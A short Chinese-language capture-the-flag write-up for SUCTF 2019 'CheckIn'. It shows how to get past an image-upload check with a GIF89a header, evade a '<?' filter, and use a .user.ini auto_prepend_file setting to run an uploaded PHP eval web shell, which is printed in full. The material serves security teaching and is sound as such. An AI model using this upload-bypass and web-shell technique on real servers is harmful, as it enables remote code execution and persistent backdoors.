# \[SUCTF 2019]CheckIn

## \[SUCTF 2019]CheckIn

## 考点

* exif\_imagetype()函数绕过
* 文件上传.user.ini

## wp

随便上传一个php文件试试

![](<../.gitbook/assets/image (19) (1).png>)

上传一个空的gif文件（就是新建空白txt再把后缀改成gif）判断有没有检查其他东西，会提示`exif_imagetype:not image!`，加上文件头`GIF89a`，就成功了。

试试上传正常图片

![](<../.gitbook/assets/image (26) (1).png>)

这儿可以猜测是`exif_imagetype()`函数判断是不是图片，在文件头添加图片头就可以绕过了，例如gif的文件头GIF89a

然后制作图片马上传

![](<../.gitbook/assets/image (1).png>)

&#x20;上传条件

1. 不能上传带有`<?`的文件，使用`<script language="php">xxx</script>`绕过
2. 上传的文件必须含有图片头

考虑使用.htaccess，但是这个服务器是nginx，而.htaccess是针对apache的。那么这里利用是 .user.ini ，而且.user,ini利用的范围比.htaccess更广

php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP\_INI\_SYSTEM、PHP\_INI\_PERDIR、PHP\_INI\_ALL、PHP\_INI\_USER

![](<../.gitbook/assets/image (14).png>)

`.user.ini`实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为`PHP_INI_PERDIR` 、 `PHP_INI_USER`的设置。

在php配置项中有两个比较有意思的项`auto_prepend_file`和`auto_append_file`，相当于指定一个文件，要执行脚本前自动包含，类似于在脚本文件前调用了require()函数。`auto_prepend_file`是在脚本文件前插入，而`auto_append_file`是在脚本文件最后才插入。

那么思路就有了，先上传图片马，然后利用.user.ini解析图片马，进行getshell

上传的.user.ini

![](<../.gitbook/assets/image (3) (1).png>)

上传的shell，常用一句话`GIF89a? <script language="php">eval($_POST[1])</script>`

![](<../.gitbook/assets/image (17).png>)

然后直接访问`/uploads/04b0951938d905b41348c1548f9c338b/`即可，因为`auto_prepend_file`自动包含了`shell.gif`

## 小结

1. 不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用`.php.ini`。
2. [user.ini文件构成的PHP后门](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)
